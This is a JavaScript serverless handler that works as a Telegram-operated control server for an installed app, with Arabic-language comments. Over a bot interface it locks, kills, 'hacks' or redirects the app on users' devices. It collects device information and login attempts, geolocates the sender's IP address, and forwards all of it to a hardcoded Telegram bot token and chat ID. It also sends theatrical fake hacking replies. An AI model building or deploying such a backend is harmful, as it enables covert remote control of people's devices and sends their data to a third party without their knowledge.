const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let banAllActive = false;
let remoteCommand = "";
let totalAttempts = 0;
let recentLogs = [];

// قائمة الأوامر التخمينية (باش نوصلو 400)
const dummyCommands = [
  "hacknasa", "hackfb", "spywa", "ddos", "matrix", "darkweb", "crypto", "bypass", "root", "ssh", "trace", "phone",
  "hackinsta", "hacktg", "spysms", "spycam", "gps", "ip", "mac", "ssid", "wifi", "bt", "nfc", "rfid",
  "encrypt", "decrypt", "bruteforce", "sqli", "xss", "rce", "lfi", "shell", "payload", "rat", "keylog", "ransom",
  "vpn", "proxy", "tor", "onion", "deepweb", "zeroday", "exploit", "malware", "virus", "trojan", "worm", "botnet",
  "ping", "portscan", "nmap", "whois", "dns", "spoof", "sniff", "mitm", "arp", "dox", "leak", "dump",
  "melt", "freeze", "overclock", "gpu", "cpu", "ram", "battery", "temp", "fan", "boot", "reboot", "shutdown",
  "format", "wipe", "factory", "admin", "super", "godmode", "ghost", "shadow", "ninja", "phantom", "specter", "wraith"
];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      if (saved) appLockStatus = saved;
      return res.status(200).send(`"${appLockStatus}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      if (saved) appSecretKey = saved;
      return res.status(200).send(`"${appSecretKey}"`);
    }
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') banAllActive = true;
      if (banAllActive) return res.status(200).send('"true"');
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      if (inKv === 1) return res.status(200).send('"true"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          if (type === 'key') {
            appSecretKey = cleanBody;
            await kvCmd('SET', 'app_secret_key', cleanBody);
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          }
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          if (type === 'sysinfo') {
            try {
              const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
              const ipData = await ipRes.json();
              const country = ipData.country || "Unknown";
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* ${country}`);
            } catch (e) {
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ`);
            }
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      const mainKeyboard = {
        inline_keyboard: [
          [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
          [{ text: "🔑 الكود", callback_data: "/getkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
          [{ text: "📱 اللوغات", callback_data: "/logs" }, { text: "🚫 المحظورين", callback_data: "/banlist" }],
          [{ text: "💀 إغلاق التطبيق", callback_data: "/killapp" }, { text: "☠️ اختراق", callback_data: "/apkhack" }]
        ]
      };

      if (text === '/start' || text === '/menu') {
        await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help باش تشوف 400 أمر.", mainKeyboard);
        return res.status(200).end();
      }

      switch (command) {
        case '/help': 
          await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
            `⚡ *الأوامر الحقيقية (تخترق التطبيق):*\n` +
            `/killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
            `💬 *الأوامر الفنية (محاكاة):*\n` +
            `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /dracarys /ignite /shadow\n\n` +
            `🧩 *وكاينين أكثر من 400 أمر تخميني (بحال /hackinsta، /gps، /encrypt) كيردو عليك بردود سينمائية.*`); 
          break;
        
        // ===== [1-10] التحكم الحقيقي فـ التطبيق =====
        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
        case '/apkhack': remoteCommand = "apkhack:1"; await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*"); break;
        case '/apkcrak': remoteCommand = "apkcrak:1"; await sendToTelegram("🔓 `[CRACK]` *License Cracked!*"); break;
        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting device data...*"); break;
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
        case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${appSecretKey}\``); } break;
        case '/getkey': appSecretKey = (await kvCmd('GET', 'app_secret_key')) || appSecretKey; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${appSecretKey}\``); break;

        // ===== [11-20] الحظر =====
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
        case '/banall': banAllActive = true; await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
        case '/unbanall': banAllActive = false; bannedDevices = []; await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
        case '/banlist': const raw = await kvCmd('SMEMBERS', 'banned_devices'); const list = Array.isArray(raw) ? raw : bannedDevices; await sendToTelegram(list.length ? `🚫 *Banned:*\n\`${list.join('\n')}\`` : "✅ *No bans.*"); break;
        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
        case '/db': await sendToTelegram(KV_URL ? "🗄️ `[DB]` *Connected.*" : "🗄️ `[DB]` *Offline.*"); break;
        case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;

        // ===== [21-400] الأوامر الفنية/التخمينية =====
        default:
          // التحقق واش الأمر كاين فـ اللائحة التخمينية
          const isDummy = dummyCommands.some(cmd => command === `/${cmd}`);
          
          if (isDummy || command.startsWith('/')) {
            // ردود فنية (Cyberpunk Style)
            const responses = [
              `☠️ \`[EXPLOIT]\` *Initiating ${command}...*\n> Bypassing firewall... Success.\n> Injecting payload... Done.`,
              `⚡ \`[SYSTEM]\` *Target acquired.*\n> Running ${command} sequence.\n> Access Level: ROOT.`,
              `🔓 \`[BYPASS]\` *Decrypting protocols...*\n> ${command} command accepted.\n> The dark web is listening.`,
              `💀 \`[DARK WEB]\` *Command ${command} acknowledged.*\n> Tracing IP... Hidden.\n> Encryption: AES-256.`,
              `🌐 \`[NETWORK]\` *Injecting ${command} into the mainframe...*\n> Port 8080 open.\n> Connection established.`,
              `🔍 \`[SCAN]\` *Executing ${command}...*\n> Vulnerability found.\n> System compromised.`,
              `🎭 \`[SHADOW]\` *The abyss responds to ${command}.*\n> Operation complete. No traces left.`,
              `🔥 \`[IGNITE]\` *Fueling the flames of ${command}...*\n> Target is burning.`,
            ];
            const randomResponse = responses[Math.floor(Math.random() * responses.length)];
            await sendToTelegram(randomResponse);
          } else {
            await sendToTelegram("❓ أمر غير معروف. كتب /help");
          }
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
